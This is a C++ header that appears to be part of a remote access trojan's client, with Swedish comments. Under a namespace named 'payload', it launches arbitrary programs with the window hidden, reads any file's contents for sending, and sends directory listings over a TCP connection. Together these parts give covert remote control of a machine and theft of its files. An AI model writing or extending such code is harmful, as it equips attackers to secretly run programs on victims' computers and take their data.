#pragma once
#include "precompile.h"
#include "process.h"
#include "directory.h"

namespace helper {
	void send_directory(tcp_client c, std::vector<dir_item> items) {
		c.send({ "dir_status", std::to_string(items.size()) });
		for (auto [item, size] : items) {
			message msg{ "filedescription", item.string() + "|" + std::to_string(size) };
			c.send(msg);
			std::cout << "send()[" << msg.buffer() << "] - " << Error(0)<< std::endl;
		}
	}
	std::pair<std::string, std::string> ArgSplit(std::string args) {

		auto found = args.find_first_of(' '); // försök hitta första separeringen

		if (found != std::string::npos) { // om lyckats
			return { args.substr(0, found), args.substr(found + 1) }; // splita vid separering
		}
		else { // annars retunera bara det självstående argumentet
			return { args, "" };
		}
	}
}

namespace payload {

	bool process_execution(std::string program, bool hide) {
		STARTUPINFOA info = { sizeof(info) };
		PROCESS_INFORMATION process_info;
		info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		if (hide) {
			info.wShowWindow = SW_HIDE;
		}
		else {
			info.wShowWindow = SW_NORMAL;
		}
		if (!CreateProcessA(0, (LPSTR)program.c_str(), 0, 0, false, CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE, 0, 0, &info, &process_info))
		{
			return false;
		}
		else {
			CloseHandle(process_info.hProcess);
			CloseHandle(process_info.hThread);
			return true;
		}
	}

	std::string process_execution_hidden(std::string program) {
		if (!process_execution(program, true))
		{
			return std::to_string(GetLastError());
		}
		else {
			return "SUCCESS";
		}
	}

	std::string process_execution_show(std::string program) {
		if (!process_execution(program, false))
		{
			return std::to_string(GetLastError());
		}
		else {
			return "SUCCESS";
		}
	}

	std::string download_file(std::string program) {
		if (std::filesystem::exists(program)) {
			std::ifstream file(program, std::ios::binary);
			return std::string((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
		}
		else {
			return "FAIL";
		}
	}

	
}

